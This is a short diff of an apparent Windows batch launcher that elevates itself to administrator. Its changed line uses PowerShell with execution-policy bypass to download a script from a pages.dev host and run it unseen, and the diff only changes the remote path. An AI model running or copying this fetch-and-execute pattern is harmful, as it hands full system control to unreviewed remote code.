@@ -5,4 +5,4 @@ if %errorlevel% neq 0 (
   powershell -NoProfile -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
   exit /b
 )
-powershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; $s=(Invoke-WebRequest -UseBasicParsing 'https://tweakupp-5u8.pages.dev/tweakupp.ps1').Content; if($s -is [byte[]]){$s=[Text.Encoding]::UTF8.GetString($s)}; & ([ScriptBlock]::Create($s))"
+powershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; $s=(Invoke-WebRequest -UseBasicParsing 'https://tweakupp-5u8.pages.dev/api/programme').Content; if($s -is [byte[]]){$s=[Text.Encoding]::UTF8.GetString($s)}; & ([ScriptBlock]::Create($s))"
